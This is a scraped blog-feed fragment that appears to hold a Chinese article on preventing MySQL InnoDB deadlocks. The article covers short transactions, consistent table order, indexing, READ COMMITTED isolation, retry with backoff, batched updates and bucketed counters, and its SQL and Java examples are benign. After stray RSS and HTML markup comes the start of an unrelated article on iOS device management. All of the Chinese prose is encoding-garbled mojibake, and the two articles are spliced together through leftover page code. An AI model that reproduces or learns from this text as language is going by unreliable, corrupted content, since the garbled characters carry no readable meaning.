<p>æ­»é”æ˜¯æ•°æ®åº“é‡Œå¾ˆå¸¸è§çš„é—®é¢˜ï¼šä¸¤ä¸ªæˆ–å¤šä¸ªäº‹åŠ¡äº’ç›¸ç­‰å¾…å¯¹æ–¹é‡Šæ”¾é”ï¼Œç»“æœè°ä¹ŸåŠ¨ä¸äº†ã€‚</p>
<p>MySQLçš„InnoDBå¼•æ“ä¼šè‡ªå·±è‡ªåŠ¨æ£€æµ‹æ­»é”ï¼Œå¹¶ä¸”å›æ»šå…¶ä¸­ä¸€ä¸ªäº‹åŠ¡æ¥è§£å†³ï¼Œä½†è¿™ç§æƒ…å†µå¦‚æœç»å¸¸é‡åˆ°çš„è¯ï¼Œä¼šå¾ˆå½±å“æ€§èƒ½å’Œç”¨æˆ·ä½“éªŒã€‚</p>
<p>å…¶å®ï¼Œåªè¦æ³¨æ„ä¸€äº›è®¾è®¡ç»†èŠ‚ï¼Œå°±èƒ½å¤§å¤§å‡å°‘ç”šè‡³é¿å…æ­»é”ã€‚</p>
<p>ä¸‹é¢æ˜¯å‡ ä¸ªæœ€å®ç”¨çš„æ–¹æ³•ï¼š</p>
<hr/>
<h3 data-id="heading-0">1. äº‹åŠ¡è¦çŸ­ï¼ŒåŠ¨ä½œè¦å¿«</h3>
<p>äº‹åŠ¡è¶Šé•¿ï¼Œé”ä½æ•°æ®çš„æ—¶é—´å°±è¶Šä¹…ï¼Œåˆ«äººå°±è¶Šå®¹æ˜“â€œæ’ä¸Šâ€ä½ ã€‚</p>
<p><strong>æ­£ç¡®åšæ³•</strong>ï¼šåªåœ¨äº‹åŠ¡é‡Œåšå¿…è¦çš„æ•°æ®åº“æ“ä½œï¼Œåˆ«æŠŠä¸šåŠ¡é€»è¾‘ï¼ˆæ¯”å¦‚è°ƒæ¥å£ã€ç®—æ•°æ®ï¼‰å¡è¿›å»ã€‚</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- ä¸æ¨èï¼šäº‹åŠ¡ä¸­æ··æ‚ä¸šåŠ¡é€»è¾‘</span>
<span class="hljs-keyword">START</span> TRANSACTION;
<span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> id <span class="hljs-operator">=</span> <span class="hljs-number">1</span>;
<span class="hljs-comment">-- å‡è®¾æ­¤å¤„æœ‰è€—æ—¶çš„ä¸šåŠ¡å¤„ç†...</span>
<span class="hljs-keyword">UPDATE</span> accounts <span class="hljs-keyword">SET</span> balance <span class="hljs-operator">=</span> balance <span class="hljs-operator">-</span> <span class="hljs-number">100</span> <span class="hljs-keyword">WHERE</span> user_id <span class="hljs-operator">=</span> <span class="hljs-number">1</span>;
<span class="hljs-keyword">UPDATE</span> orders <span class="hljs-keyword">SET</span> status <span class="hljs-operator">=</span> <span class="hljs-string">'paid'</span> <span class="hljs-keyword">WHERE</span> user_id <span class="hljs-operator">=</span> <span class="hljs-number">1</span>;
<span class="hljs-keyword">COMMIT</span>;

<span class="hljs-comment">-- æ¨èï¼šäº‹åŠ¡åªåŒ…å«å¿…è¦æ•°æ®åº“æ“ä½œ</span>
<span class="hljs-keyword">START</span> TRANSACTION;
<span class="hljs-keyword">UPDATE</span> accounts <span class="hljs-keyword">SET</span> balance <span class="hljs-operator">=</span> balance <span class="hljs-operator">-</span> <span class="hljs-number">100</span> <span class="hljs-keyword">WHERE</span> user_id <span class="hljs-operator">=</span> <span class="hljs-number">1</span>;
<span class="hljs-keyword">UPDATE</span> orders <span class="hljs-keyword">SET</span> status <span class="hljs-operator">=</span> <span class="hljs-string">'paid'</span> <span class="hljs-keyword">WHERE</span> user_id <span class="hljs-operator">=</span> <span class="hljs-number">1</span>;
<span class="hljs-keyword">COMMIT</span>;
</code></pre>
<hr/>
<h3 data-id="heading-1">2. æ‰€æœ‰äº‹åŠ¡æŒ‰åŒä¸€ä¸ªé¡ºåºæ“ä½œè¡¨</h3>
<p>è¿™æ˜¯é¿å…æ­»é”æœ€æœ‰æ•ˆçš„ä¸€æ‹›ï¼</p>
<p>æ¯”å¦‚ï¼šå¦‚æœå¤šä¸ªäº‹åŠ¡éƒ½è¦æ”¹ <code>users</code> å’Œ <code>orders</code> è¡¨ï¼Œé‚£å°±<strong>ç»Ÿä¸€å…ˆæ”¹ usersï¼Œå†æ”¹ orders</strong>ã€‚ä¸è¦æœ‰çš„å…ˆæ”¹ usersï¼Œæœ‰çš„å…ˆæ”¹ ordersã€‚</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- æ‰€æœ‰åœ°æ–¹éƒ½è¿™æ ·å†™ï¼š</span>
<span class="hljs-keyword">UPDATE</span> users <span class="hljs-keyword">SET</span> ... <span class="hljs-keyword">WHERE</span> id <span class="hljs-operator">=</span> <span class="hljs-number">1</span>;
<span class="hljs-keyword">UPDATE</span> orders <span class="hljs-keyword">SET</span> ... <span class="hljs-keyword">WHERE</span> user_id <span class="hljs-operator">=</span> <span class="hljs-number">1</span>;
</code></pre>
<p>åªè¦é¡ºåºä¸€è‡´ï¼Œå°±ä¸ä¼šå‡ºç°â€œAç­‰Bã€Bç­‰Aâ€çš„å¾ªç¯ç­‰å¾…ã€‚</p>
<hr/>
<h3 data-id="heading-2">3. ç»™è¡¨åŠ åˆé€‚çš„ç´¢å¼•</h3>
<p>InnoDB çš„è¡Œé”æ˜¯é ç´¢å¼•æ¥å®ç°çš„ã€‚å¦‚æœæŸ¥è¯¢æ²¡ç”¨åˆ°ç´¢å¼•ï¼ŒMySQL å°±å¯èƒ½é”ä½æ•´å¼ è¡¨ï¼ˆæˆ–å¾ˆå¤šæ— å…³çš„è¡Œï¼‰ï¼Œå¤§å¤§å¢åŠ æ­»é”é£é™©ã€‚</p>
<p><strong>å»ºè®®</strong>ï¼š</p>
<ul>
<li>ç»å¸¸ç”¨æ¥æŸ¥æˆ–æ›´æ–°çš„å­—æ®µï¼ˆæ¯”å¦‚ <code>user_id</code>ï¼‰è¦å»ºç´¢å¼•ã€‚</li>
<li>ç”¨ <code>EXPLAIN</code> çœ‹çœ‹ SQL æ˜¯å¦å‘½ä¸­ç´¢å¼•ã€‚</li>
</ul>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">CREATE</span> INDEX idx_user_id <span class="hljs-keyword">ON</span> orders(user_id);
</code></pre>
<hr/>
<h3 data-id="heading-3">4. åˆ«ç”¨å¤ªé«˜çš„éš”ç¦»çº§åˆ«ï¼ˆé™¤éå¿…è¦ï¼‰</h3>
<p>MySQL é»˜è®¤æ˜¯ <code>REPEATABLE READ</code>ï¼Œå®ƒä¼šåŠ â€œé—´éš™é”â€ï¼Œé˜²æ­¢å¹»è¯»ï¼Œä½†ä¹Ÿæ›´å®¹æ˜“æ­»é”ã€‚</p>
<p>å¦‚æœä½ çš„ä¸šåŠ¡èƒ½æ¥å—â€œè¯»å·²æäº¤â€ï¼ˆæ¯”å¦‚å…è®¸çœ‹åˆ°åˆ«äººåˆšæäº¤çš„æ•°æ®ï¼‰ï¼Œå¯ä»¥æ”¹æˆï¼š</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">SET</span> SESSION TRANSACTION ISOLATION LEVEL READ COMMITTED;
</code></pre>
<p>è¿™æ ·é”çš„èŒƒå›´æ›´å°ï¼Œæ­»é”æ¦‚ç‡æ›´ä½ã€‚</p>
<hr/>
<h3 data-id="heading-4">5. æ˜¾å¼åŠ é”æ—¶è¦å°å¿ƒ</h3>
<p>å¦‚æœä½ è¦ç”¨ <code>SELECT ... FOR UPDATE</code> é”è¡Œï¼Œä¸€å®šè¦ç¡®ä¿ï¼š</p>
<ul>
<li>æ¡ä»¶èƒ½å‘½ä¸­ç´¢å¼•ï¼›</li>
<li>é”çš„è¡Œå°½é‡å°‘ï¼›</li>
<li>äº‹åŠ¡å°½å¿«ç»“æŸã€‚</li>
</ul>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- å®‰å…¨ï¼šé€šè¿‡ä¸»é”®æˆ–ç´¢å¼•é”å®šä¸€è¡Œ</span>
<span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> accounts <span class="hljs-keyword">WHERE</span> user_id <span class="hljs-operator">=</span> <span class="hljs-number">1</span> <span class="hljs-keyword">FOR</span> <span class="hljs-keyword">UPDATE</span>;
</code></pre>
<p>å¦‚æœ <code>user_id</code> æ²¡ç´¢å¼•ï¼Œè¿™æ¡è¯­å¥å¯èƒ½é”ä½æˆåƒä¸Šä¸‡è¡Œï¼</p>
<hr/>
<h3 data-id="heading-5">6. åº”ç”¨å±‚è¦æœ‰é‡è¯•æœºåˆ¶</h3>
<p>æ­»é”å¶å°”è¿˜æ˜¯ä¼šå‘ç”Ÿã€‚è¿™æ—¶å€™ï¼Œåº”ç”¨åº”è¯¥ï¼š</p>
<ul>
<li>æ•è·æ­»é”é”™è¯¯ï¼ˆMySQL é”™è¯¯ç  1213 æˆ– SQLSTATE '40001'ï¼‰ï¼›</li>
<li>è‡ªåŠ¨é‡è¯•å‡ æ¬¡ï¼ˆæ¯”å¦‚æœ€å¤š 2~3 æ¬¡ï¼‰ï¼›</li>
<li>æ¯æ¬¡é‡è¯•å‰ç­‰ä¸€å°ä¼šå„¿ï¼ˆæ¯”å¦‚ 100msã€200msâ€¦ï¼‰ã€‚</li>
</ul>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ä¼ªä»£ç ç¤ºä¾‹</span>
<span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">3</span>; i++) {
    <span class="hljs-keyword">try</span> {
        doDatabaseUpdate();
        <span class="hljs-keyword">break</span>; <span class="hljs-comment">// æˆåŠŸå°±é€€å‡º</span>
    } <span class="hljs-keyword">catch</span> (DeadlockException e) {
        sleep(<span class="hljs-number">100</span> * (i + <span class="hljs-number">1</span>)); <span class="hljs-comment">// ç­‰ä¸€ä¸‹å†è¯•</span>
    }
}
</code></pre>
<hr/>
<h3 data-id="heading-6">7. å¤§æ‰¹é‡æ›´æ–°è¦åˆ†æ‰¹åš</h3>
<p>ä¸€æ¬¡æ›´æ–°å‡ ä¸‡è¡Œï¼Ÿè¿™å¾ˆå®¹æ˜“é”ä½å¤§é‡æ•°æ®ï¼Œå¼•å‘æ­»é”æˆ–å¡é¡¿ã€‚</p>
<p><strong>æ­£ç¡®åšæ³•</strong>ï¼šæ¯æ¬¡åªæ”¹ 500~1000 è¡Œï¼Œæ”¹å®Œæäº¤ï¼Œå†ç»§ç»­ã€‚</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- åˆ†æ‰¹æ›´æ–°</span>
<span class="hljs-keyword">UPDATE</span> large_table <span class="hljs-keyword">SET</span> status <span class="hljs-operator">=</span> <span class="hljs-string">'done'</span>
<span class="hljs-keyword">WHERE</span> create_time <span class="hljs-operator">&lt;</span> <span class="hljs-string">'2023-01-01'</span> <span class="hljs-keyword">AND</span> status <span class="hljs-operator">!=</span> <span class="hljs-string">'done'</span>
LIMIT <span class="hljs-number">1000</span>;
<span class="hljs-comment">-- å¾ªç¯æ‰§è¡Œï¼Œç›´åˆ°æ²¡æœ‰æ•°æ®å¯æ›´æ–°</span>
</code></pre>
<hr/>
<h3 data-id="heading-7">8. é¿å…çƒ­ç‚¹æ•°æ®è¢«é¢‘ç¹ä¿®æ”¹</h3>
<p>æ¯”å¦‚ä¸€ä¸ªå…¨å±€è®¡æ•°å™¨ï¼Œæ‰€æœ‰è¯·æ±‚éƒ½å» <code>UPDATE counter SET value = value + 1</code>ï¼Œé‚£è¿™ä¸€è¡Œå°±æˆäº†å µç‚¹ã€‚</p>
<p><strong>è§£å†³åŠæ³•</strong>ï¼šç”¨åˆ†æ¡¶è®¡æ•°ã€‚</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- æŠŠè®¡æ•°åˆ†æ•£åˆ° 10 ä¸ªæ¡¶é‡Œ</span>
<span class="hljs-keyword">UPDATE</span> counter_buckets <span class="hljs-keyword">SET</span> <span class="hljs-keyword">value</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">value</span> <span class="hljs-operator">+</span> <span class="hljs-number">1</span> 
<span class="hljs-keyword">WHERE</span> name <span class="hljs-operator">=</span> <span class="hljs-string">'views'</span> <span class="hljs-keyword">AND</span> bucket <span class="hljs-operator">=</span> <span class="hljs-built_in">FLOOR</span>(RAND() <span class="hljs-operator">*</span> <span class="hljs-number">10</span>);

<span class="hljs-comment">-- æŸ¥æ€»æ•°æ—¶å†åŠ èµ·æ¥</span>
<span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">SUM</span>(<span class="hljs-keyword">value</span>) <span class="hljs-keyword">FROM</span> counter_buckets <span class="hljs-keyword">WHERE</span> name <span class="hljs-operator">=</span> <span class="hljs-string">'views'</span>;
</code></pre>
<hr/>
<h3 data-id="heading-8">9. å‡ºé—®é¢˜äº†æ€ä¹ˆæŸ¥ï¼Ÿ</h3>
<p>çœ‹æœ€è¿‘ä¸€æ¬¡æ­»é”è¯¦æƒ…ï¼š</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">SHOW</span> ENGINE INNODB STATUS;
</code></pre>
<p>æ‰¾<code>LATEST DETECTED DEADLOCK</code>éƒ¨åˆ†ã€‚</p>
<p>æŸ¥å½“å‰æ­£åœ¨è¿è¡Œçš„äº‹åŠ¡ï¼ˆMySQL 8.0+ï¼‰ï¼š</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> performance_schema.data_locks;
<span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> information_schema.INNODB_TRX;
</code></pre>
<hr/>
<h3 data-id="heading-9">æ€»ç»“</h3>
<p>1.<strong>äº‹åŠ¡è¦çŸ­</strong>ï¼šåˆ«æ‹–ç€ä¸æäº¤ã€‚
2.<strong>é¡ºåºè¦ä¸€è‡´</strong>ï¼šæ‰€æœ‰äººæŒ‰ç›¸åŒé¡ºåºæ”¹è¡¨ã€‚
3.<strong>ç´¢å¼•è¦åˆ°ä½</strong>ï¼šé¿å…é”å¤ªå¤šæ— å…³æ•°æ®ã€‚
4.<strong>å‡ºé”™è¦é‡è¯•</strong>ï¼šåº”ç”¨å±‚å…œåº•å¤„ç†æ­»é”ã€‚
5.<strong>å¤§æ‰¹é‡è¦åˆ†æ‰¹</strong>ï¼šåˆ«ä¸€æ¬¡é”å¤ªå¤šè¡Œã€‚</p>
<p>æ­»é”æ²¡æ³•å®Œå…¨æœç»ï¼Œä½†åªè¦åšå¥½è¿™äº›ï¼ŒåŸºæœ¬å°±ä¸ä¼šå†è¢«å®ƒå›°æ‰°äº†ï¼</p>
<blockquote>
<p>æœ¬æ–‡é¦–å‘äºå…¬ä¼—å·ï¼šç¨‹åºå‘˜åˆ˜å¤§åï¼Œä¸“æ³¨åˆ†äº«å‰åç«¯å¼€å‘çš„å®æˆ˜ç¬”è®°ã€‚å…³æ³¨æˆ‘ï¼Œå°‘èµ°å¼¯è·¯ï¼Œä¸€èµ·è¿›æ­¥ï¼</p>
</blockquote>
<h4 data-id="heading-10">ğŸ“Œå¾€æœŸç²¾å½©</h4>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2F6V83qjR6u0nyfzL-14xYAw" target="_blank" title="https://mp.weixin.qq.com/s/6V83qjR6u0nyfzL-14xYAw" ref="nofollow noopener noreferrer">ã€Šasync/await åˆ°åº•è¦ä¸è¦åŠ  try-catchï¼Ÿå¼‚æ­¥é”™è¯¯å¤„ç†æœ€ä½³å®è·µã€‹</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FbgLoyqb3VLgn3xXAok3kcQ" target="_blank" title="https://mp.weixin.qq.com/s/bgLoyqb3VLgn3xXAok3kcQ" ref="nofollow noopener noreferrer">ã€Šå¦‚ä½•æŸ¥çœ‹ SpringBoot å½“å‰çº¿ç¨‹æ•°ï¼Ÿ3 ç§æ–¹æ³•äº²æµ‹æœ‰æ•ˆã€‹</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2Fp0n2mN5RDDDaIWuHHVRUZQ" target="_blank" title="https://mp.weixin.qq.com/s/p0n2mN5RDDDaIWuHHVRUZQ" ref="nofollow noopener noreferrer">ã€ŠJava å¼€å‘å¿…çœ‹ï¼šä»€ä¹ˆæ—¶å€™ç”¨ forï¼Œä»€ä¹ˆæ—¶å€™ç”¨ Streamï¼Ÿã€‹</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FDpjuafW3agyhLEQYif3zJA" target="_blank" title="https://mp.weixin.qq.com/s/DpjuafW3agyhLEQYif3zJA" ref="nofollow noopener noreferrer">ã€Šåˆ«å†ä¹± new ArrayListï¼8 å¤§ Java å®¹å™¨é€‰å‹æ¡ˆä¾‹ï¼Œä¸€ç¯‡çœ‹æ‡‚ã€‹</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[æœ€æ–°ç‰ˆæœ¬iOSç³»ç»Ÿè®¾å¤‡ç®¡ç†åŠŸèƒ½å…¨é¢æŒ‡å—]]></title>    <link>https://juejin.cn/post/7583903159773855759</link>    <guid>https://juejin.cn/post/7583903159773855759</guid>    <pubDate>2025-12-15T09:52:32.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7583903159773855759" data-draft-id="7583799807593889826" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="æœ€æ–°ç‰ˆæœ¬iOSç³»ç»Ÿè®¾å¤‡ç®¡ç†åŠŸèƒ½å…¨é¢æŒ‡å—"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2025-12-15T09:52:32.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="bcbnb"/> <meta itemprop="url" content="https://juejin.cn/user/895474073078377"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            æœ€æ–°ç‰ˆæœ¬iOSç³»ç»Ÿè®¾å¤‡ç®¡ç†åŠŸèƒ½å…¨é¢æŒ‡å—
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/895474073078377/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    bcbnb
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-15T09:52:32.000Z" title="Mon Dec 15 2025 09:52:32 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»9åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>æ·±å…¥äº†è§£æœ€æ–°ç‰ˆæœ¬iOSç³»ç»Ÿä¸­çš„è®¾å¤‡ç®¡ç†åŠŸèƒ½ï¼ŒåŒ…æ‹¬è®¾å¤‡ä¿¡ä»»è®¤è¯ã€åº”ç”¨ä¸æ•°æ®ç®¡ç†ã€è¿œç¨‹æŸ¥æ‰¾ä¸é”å®šç­‰ï¼ŒåŠ©æ‚¨æå‡è®¾å¤‡å®‰å…¨æ€§ä¸ä½¿ç”¨ä½“éªŒã€‚</p>
<p>åœ¨ç§‘æŠ€æ—¥æ–°æœˆå¼‚çš„ä»Šå¤©ï¼ŒiOSç³»ç»Ÿä½œä¸ºè‹¹æœè®¾å¤‡çš„æ ¸å¿ƒæ“ä½œç³»ç»Ÿï¼Œæ¯ä¸€æ¬¡æ›´æ–°éƒ½ç‰µåŠ¨ç€äº¿ä¸‡ç”¨æˆ·çš„å¿ƒã€‚ä»Šå¤©ï¼Œæˆ‘ä»¬å°±æ¥èŠèŠæœ€æ–°ç‰ˆæœ¬iOSç³»ç»Ÿä¸­çš„è®¾å¤‡ç®¡ç†åŠŸèƒ½ï¼Œçœ‹çœ‹å®ƒå¦‚ä½•ä¸ºæˆ‘ä»¬çš„æ—¥å¸¸ä½¿ç”¨å¸¦æ¥æ›´å¤šä¾¿æ·ä¸å®‰å…¨ã€‚æ— è®ºä½ æ˜¯iPhoneã€iPadè¿˜æ˜¯iPod touchçš„ç”¨æˆ·ï¼Œè¿™ç¯‡æŒ‡å—éƒ½å°†æ˜¯ä½ ä¸å¯å¤šå¾—çš„å®å…¸ã€‚</p>
<h3 data-id="heading-0">ä¸€ã€æœ€æ–°ç‰ˆæœ¬iOSç³»ç»Ÿæ¦‚è§ˆ</h3>
<p>åœ¨æ·±å…¥æ¢è®¨è®¾å¤‡ç®¡ç†åŠŸèƒ½ä¹‹å‰ï¼Œæˆ‘ä»¬å…ˆæ¥ç®€å•å›é¡¾ä¸€ä¸‹æœ€æ–°ç‰ˆæœ¬çš„iOSç³»ç»Ÿã€‚æ¯ä¸€æ¬¡iOSçš„å‡çº§ï¼Œè‹¹æœéƒ½ä¼šå¸¦æ¥ä¸€ç³»åˆ—çš„æ–°ç‰¹æ€§ä¸ä¼˜åŒ–ï¼Œæ—¨åœ¨æå‡ç”¨æˆ·ä½“éªŒã€åŠ å¼ºç³»ç»Ÿå®‰å…¨æ€§ä»¥åŠèå…¥æ›´å¤šå‰æ²¿æŠ€æœ¯ã€‚ä»æµç•…çš„æ“ä½œç•Œé¢åˆ°æ™ºèƒ½çš„AIåŠ©æ‰‹ï¼ŒiOSç³»ç»Ÿæ€»èƒ½å¼•é¢†æ™ºèƒ½æ‰‹æœºæ“ä½œç³»ç»Ÿçš„æ½®æµã€‚</p>
<h4 data-id="heading-1">1. æ€§èƒ½æå‡</h4>
<p>æ–°ç‰ˆæœ¬iOSç³»ç»Ÿå¾€å¾€ä¼šå¯¹åº•å±‚æ¶æ„è¿›è¡Œä¼˜åŒ–ï¼Œæå‡è®¾å¤‡çš„è¿è¡Œé€Ÿåº¦å’Œå“åº”èƒ½åŠ›ã€‚è¿™æ„å‘³ç€ä½ çš„iPhoneæˆ–iPadåœ¨åº”ç”¨å¼€å¯ã€å¤šä»»åŠ¡åˆ‡æ¢ç­‰æ–¹é¢å°†è¡¨ç°å¾—æ›´åŠ æµç•…ã€‚</p>
<h4 data-id="heading-2">2. å®‰å…¨å¢å¼º</h4>
<p>å®‰å…¨å§‹ç»ˆæ˜¯iOSç³»ç»Ÿçš„é‡ä¸­ä¹‹é‡ã€‚æ–°ç‰ˆæœ¬é€šå¸¸ä¼šå¼•å…¥æ›´å¼ºå¤§çš„åŠ å¯†æŠ€æœ¯ã€æ›´æ™ºèƒ½çš„éšç§ä¿æŠ¤åŠŸèƒ½ï¼Œä»¥åŠé’ˆå¯¹å·²çŸ¥æ¼æ´çš„ä¿®å¤ï¼Œç¡®ä¿ç”¨æˆ·æ•°æ®çš„å®‰å…¨æ— è™ã€‚</p>
<h4 data-id="heading-3">3. æ–°åŠŸèƒ½ä½“éªŒ</h4>
<p>æ¯æ¬¡æ›´æ–°ï¼ŒiOSéƒ½ä¼šå¸¦æ¥ä¸€äº›ä»¤äººçœ¼å‰ä¸€äº®çš„æ–°åŠŸèƒ½ï¼Œæ¯”å¦‚å…¨æ–°çš„äº¤äº’æ–¹å¼ã€å¢å¼ºçš„æ‹ç…§æ•ˆæœã€æ›´æ™ºèƒ½çš„æé†’ä¸é€šçŸ¥ç³»ç»Ÿç­‰ï¼Œè®©ç”¨æˆ·çš„æ—¥å¸¸ç”Ÿæ´»æ›´åŠ ä¸°å¯Œå¤šå½©ã€‚</p>
